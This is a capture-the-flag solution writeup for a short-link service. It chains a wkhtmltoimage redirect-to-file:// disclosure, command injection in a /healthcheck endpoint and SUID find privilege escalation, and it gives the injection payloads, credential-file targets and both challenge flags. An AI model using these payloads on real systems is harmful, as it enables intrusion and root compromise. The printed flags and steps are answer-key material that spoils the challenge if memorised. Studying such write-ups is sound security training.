# Short-link Generator — Solution Writeup

**Flags (two total):**
- Stage 1 reward (source disclosure): `sgctf{never_trust_users_with_your_application}`
- Stage 3 reward (root): `sgctf{how_in_the_world_did_we_get_here}`

## TL;DR

1. **Stage 1 — Local file disclosure (CVE-2022-35583 / CVE-2020-21365).** The screenshot service runs `wkhtmltoimage --enable-local-file-access` on every submitted URL. Stand up an HTTP server that 302-redirects to `file:///app/server.py`, submit its URL, read the source from the resulting preview PNG.
2. **Stage 2 — Command injection.** The leaked source reveals a `/healthcheck` endpoint that interpolates user input into `subprocess.run(f"curl -sS -I --max-time 5 {url}", shell=True)`. Inject with `;cmd;#`. RCE as user `app`.
3. **Stage 3 — SUID privesc.** `/usr/bin/find` has the SUID bit set. `find -exec /bin/sh -p` keeps the elevated euid, reads `/root/flag.txt`.

## Stage 1 — File disclosure through the screenshot renderer

### The sink

The submit handler hands every user-supplied URL to `wkhtmltoimage` with `--enable-local-file-access` and renders the result as the link's "preview thumbnail." That flag tells the renderer to follow `file://` references — a setting only safe if the renderer is *also* limited to a trusted page.

### What does NOT work

A natural first attempt: host an HTML page with an iframe or XHR pointing at `file:///app/server.py`. Qt WebKit (which powers wkhtmltoimage 0.12.6) refuses both:

- **Iframe**: cross-origin embed of `file://` from an `http://` document → blank.
- **XHR/fetch**: `NETWORK_ERR: XMLHttpRequest Exception 101` — same-origin policy blocks the request before `--enable-local-file-access` is consulted.

### What works: an HTTP 302 redirect to `file://`

The bypass operates one layer down. Qt's network layer follows HTTP redirects *before* WebKit enforces same-origin checks, so if the attacker's HTTP server returns a `302 Location: file:///...`, the renderer ends up loading the local file directly. Once the page's origin is `file://`, there's no cross-origin restriction — the file's contents *are* the page, and the screenshot captures them.

`solve/redirect_server.py` does exactly this. Start it pointed at your target:

```sh
./redirect_server.py file:///app/server.py
```

It listens on `:9000` and 302s every request to the supplied `file://` URL. In the Short-link Generator UI, submit:

```
http://host.docker.internal:9000/
```

(Use whatever hostname is reachable from inside the container — `host.docker.internal` works on Docker Desktop; on a remote box, use the host's public IP.)

The preview PNG is a screenshot of `/app/server.py`. Right-click → save, or just read it in the page.

### Useful targets

```sh
./redirect_server.py file:///app/server.py        # app source -- where to look for Stage 2
./redirect_server.py file:///etc/passwd           # confirm 'app' is uid 1000
./redirect_server.py file:///proc/self/environ    # env vars of the gunicorn worker
./redirect_server.py file:///proc/self/cmdline    # exact argv of the worker
./redirect_server.py file:///root/flag.txt        # won't work -- app user can't read it (set up for Stage 3)
```

Reading `server.py` reveals:
- A hardcoded `DEPLOY_TOKEN = "sgctf{never_trust_users_with_your_application}"` near the top — **Stage 1 flag**. The developer's `TODO(eng): rotate before public launch` comment is the only thing protecting it. They didn't rotate.
- `/shorten` passes the URL to `subprocess.run([...])` as a list argument — **not** a shell-injection sink.
- `/healthcheck` interpolates the URL into a string passed to `subprocess.run(..., shell=True)` — **that** is the sink for Stage 2.

## Stage 2 — Command injection on `/healthcheck`

The vulnerable code in `server.py`:

```python
result = subprocess.run(
    f"curl -sS -I --max-time 5 {url}",
    shell=True, ...
)
```

The `url` query parameter is interpolated straight into a shell string. Close the curl invocation with `;`, run your payload, comment out whatever follows with `#`:

```sh
curl 'http://localhost:8080/healthcheck?url=x;id;%23'
```

Output (curl errors out on the dummy `x`, but the shell still runs everything after the `;`):

```
uid=1000(app) gid=1000(app) groups=1000(app)
curl: (6) Could not resolve host: x
```

RCE confirmed as user `app`.

Confirm the flag is here but unreadable by `app`:

```sh
curl 'http://localhost:8080/healthcheck?url=x;ls%20-la%20/root/flag.txt;cat%20/root/flag.txt;%23'
```

Yields `-r-------- 1 root root` and `cat: /root/flag.txt: Permission denied`. Need root.

## Stage 3 — SUID `find` → root → flag

Find SUID-root binaries on the box:

```sh
curl 'http://localhost:8080/healthcheck?url=x;find%20/%20-perm%20-4000%20-type%20f%202>/dev/null;%23'
```

Among the usual `su`, `sudo`, `mount`, `passwd` is one odd entry:

```
/usr/bin/find
```

`find` is a classic GTFOBin. Its `-exec` child runs with `find`'s effective uid; because `find` has the SUID bit, that child runs as root. `sh -p` keeps the elevated euid (without `-p`, `sh` drops it for safety):

```sh
curl 'http://localhost:8080/healthcheck?url=x;find%20/etc/hostname%20-exec%20/bin/sh%20-p%20-c%20%27cat%20/root/flag.txt%27%20%5C%3B;%23'
```

(The `find /etc/hostname` is just a path guaranteed to match exactly once so `-exec` fires.)

Easier to construct via `curl --data-urlencode`:

```sh
curl -G --data-urlencode \
  "url=x;find /etc/hostname -exec /bin/sh -p -c 'cat /root/flag.txt' \;;#" \
  http://localhost:8080/healthcheck
```

Output (Stage 3 flag):

```
sgctf{how_in_the_world_did_we_get_here}
```

Done.

## Topic alignment

- **CVEs / Zero-days** — CVE-2022-35583, CVE-2020-21365 (wkhtmltopdf / wkhtmltoimage file disclosure via redirect-to-`file://`).
- **Infrastructure reconnaissance** — reading `/app/server.py` to find the next sink, `find -perm -4000` to find the SUID misconfig.
- **Privilege escalation** — SUID GTFOBin (`find`) → root → flag.
